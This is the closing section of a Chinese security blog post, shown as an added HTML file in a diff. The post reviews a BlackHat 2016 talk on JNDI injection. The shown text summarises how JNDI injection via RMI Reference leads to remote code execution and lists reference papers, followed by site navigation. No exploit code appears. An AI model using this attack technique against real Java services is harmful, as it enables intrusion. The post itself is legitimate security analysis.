+<h3 id="0x04-简单总结"><a href="#0x04-简单总结" class="headerlink" title="0x04 简单总结"></a>0x04 简单总结</h3><p>由于 Java 知识能力有限，原议题中所涉及到的一些细节可能剖析得不太准确。文中只是简单地把 JNDI 注入的形成原理和如何利用 JNDI 注入进行 RCE 进行了一个说明，具体的攻击方式也只是谈到了用 RMI Reference 进行远程代码执行，原议题内容中还介绍了一些其它的攻击向量能够达到远程代码执行的效果，例如反序列化触发 JNDI 注入、使用 Remote Locations 进行代码执行和一些安全机制的绕过等等。</p>
+<p>像今年 1 月份有关 Spring 框架反序列化导致远程代码执行的这个漏洞最根本原理就是利用了 JNDI 注入，有关详情可以参考 <a href="https://www.iswin.org/" target="_blank" rel="noopener">@随风</a> 师傅的文章 - <a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">《Spring framework deserialization RCE漏洞分析以及利用》</a>，更多关于该议题的内容还是翻阅下原 Paper 比较好。</p>
+<p>（世上漏洞如海，我愿略知一二）</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></li>
+<li><a href="http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection" target="_blank" rel="noopener">http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection</a></li>
+<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html</a></li>
+<li><a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用" target="_blank" rel="noopener">https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-JNDI-是什么？"><span class="toc-number">1.</span> <span class="toc-text">0x00 - JNDI 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-JNDI-获取并调用远程方法"><span class="toc-number">1.1.</span> <span class="toc-text">1. JNDI 获取并调用远程方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RMI-中动态加载字节代码"><span class="toc-number">1.2.</span> <span class="toc-text">2. RMI 中动态加载字节代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-协议动态转换"><span class="toc-number">2.</span> <span class="toc-text">0x02 JNDI 协议动态转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-利用-JNDI-注入加载远程代码并执行"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用 JNDI 注入加载远程代码并执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-简单总结"><span class="toc-number">4.</span> <span class="toc-text">0x04 简单总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&text=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&is_video=false&description=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BlackHat 2016 回顾之 JNDI 注入简单解析&body=Check out this article: http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 回顾之 JNDI 注入简单解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&name=BlackHat 2016 回顾之 JNDI 注入简单解析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
